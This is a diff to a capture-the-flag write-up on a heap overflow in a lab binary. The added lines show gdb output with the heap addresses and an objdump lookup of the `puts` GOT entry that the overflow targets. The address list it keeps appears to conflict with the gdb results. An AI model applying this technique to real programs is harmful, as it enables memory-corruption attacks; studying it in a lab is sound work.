@@ -4,14 +4,52 @@
 
 The binary allocates two structures and two string buffers on the heap. It uses `strcpy` to copy user input into the first buffer, then again into the second buffer, using pointers stored in the structures. The goal is to overflow the first buffer to overwrite the pointer in the second structure, so that the second `strcpy` writes to a controlled location (e.g., the GOT entry for `puts`).
 
-Relevant code:
+With gdb, we find the addresses returned by `malloc` for the two structures and the two buffers:
 ```
 - malloc for struct_1 (0x0804a018)
 - malloc for buffer_1 (0x0804a028)
 - malloc for struct_2 (0x0804a038)
 - malloc for buffer_2 (0x0804a048)
+```
 
-Overflow buffer_1 to overwrite struct_2[1] (pointer at 0x0804a03c).
+```
+(gdb) b *0x08048536
+Breakpoint 1 at 0x8048536
+(gdb) b *0x08048550
+Breakpoint 2 at 0x8048550
+(gdb) b *0x08048565
+Breakpoint 3 at 0x8048565
+(gdb) b *0x0804857f
+Breakpoint 4 at 0x804857f
+(gdb) r hello world
+Starting program: /home/user/level7/level7 hello world
+
+Breakpoint 1, 0x08048536 in main ()
+(gdb) p/x $eax
+$1 = 0x804a008
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048550 in main ()
+(gdb) p/x $eax
+$2 = 0x804a018
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x08048565 in main ()
+(gdb) p/x $eax
+$3 = 0x804a028
+(gdb) c
+Continuing.
+
+Breakpoint 4, 0x0804857f in main ()
+(gdb) p/x $eax
+$4 = 0x804a038
+```
+
+```
+level7@RainFall:~$ objdump -R ./level7 | grep puts
+08049928 R_386_JUMP_SLOT   puts
 ```
 
 ## Exploitation
